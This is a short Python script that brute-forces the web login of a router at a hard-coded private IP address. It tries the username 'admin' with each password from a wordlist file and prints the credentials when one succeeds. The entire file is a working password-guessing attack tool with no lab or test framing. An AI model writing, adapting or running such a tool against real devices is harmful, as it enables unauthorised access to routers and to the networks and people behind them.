import requests

def read_items_from_file(file_name):
    with open(file_name, 'r') as file:
        items = [line.strip() for line in file]
    return items

def login(router_ip, username, password):
    url = f"http://{router_ip}/"
    try:
        response = requests.get(url, auth=(username, password))
        if response.status_code == 200:
            return True
    except requests.RequestException as e:
        pass
    return False

def main():
    router_ip = "192.168.13.166" 
    username = "admin"  
    passwords = read_items_from_file('proactive.txt')
    for password in passwords:
        print(f"Trying password: {password}")
        if login(router_ip, username, password):
            print("Logging Successful")
            print(f"Username: {username}\nPassword: {password}")
            return 
    print("Logging Failed")

if __name__ == "__main__":
    main()


